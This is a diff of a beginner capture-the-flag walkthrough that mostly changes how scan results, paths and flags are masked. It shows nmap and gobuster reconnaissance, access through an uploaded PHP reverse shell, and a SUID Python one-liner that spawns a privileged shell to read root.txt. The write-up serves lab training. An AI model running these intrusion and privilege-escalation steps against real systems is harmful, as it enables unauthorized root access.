@@ -23,9 +23,9 @@ A ctf for beginners, can you root me?
 sudo nmap -A -vv -T4 -oA initial 1*.**.***.*** 
 ```
 
-> `22/tcp open *** syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
+> `22/tcp open *** syn-ack ttl 61 O***SSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
 
-> `80/tcp open http syn-ack ttl 61 Apache httpd 2.*.** ((Ubuntu))`
+> `80/tcp open **** syn-ack ttl 61 A***** httpd 2.*.** ((Ubuntu))`
 
 ```bash
 gobuster dir -u 1*.**.***.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 100
@@ -67,13 +67,13 @@ Go to: `http://1*.**.***.***/u******/php-reverse-shell.php5`
 RHOST:
 
 ```bash
-find / -type f -name u***.*** 2>/dev/null
+find / -type f -name user.txt 2>/dev/null
 ```
 
-> `/var/www/u***.***`
+> `/***/***/user.txt`
 
 ```bash
-cat /var/www/u***.***
+cat /***/***/user.txt
 ```
 
 > `THM{***_***_*_*****}`
@@ -93,10 +93,10 @@ p***** -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 find / -type f -name r***.***
 ```
 
-> `/r***/root.txt`
+> `/****/root.txt`
 
 ```bash
-cat /r***/root.txt
+cat /****/root.txt
 ```
 
 > `THM{*********_**********}`
